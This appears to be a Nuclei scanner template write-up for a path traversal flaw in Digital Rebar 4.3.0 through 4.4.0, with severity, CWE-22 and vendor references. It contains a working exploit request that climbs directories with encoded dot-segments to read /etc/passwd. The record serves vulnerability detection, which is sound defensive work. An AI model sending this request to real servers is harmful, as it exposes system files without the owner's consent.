# Nuclei Template: Digital Rebar - Local File Inclusion
**Template ID:** digitalrebar-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`digitalrebar-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because web requests can navigate outside of DRP controlled areas.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## References
- https://docs.rackn.io/en/latest/doc/security/cve_20200924A.html
- https://docs.rackn.io/en/latest/doc/release.html
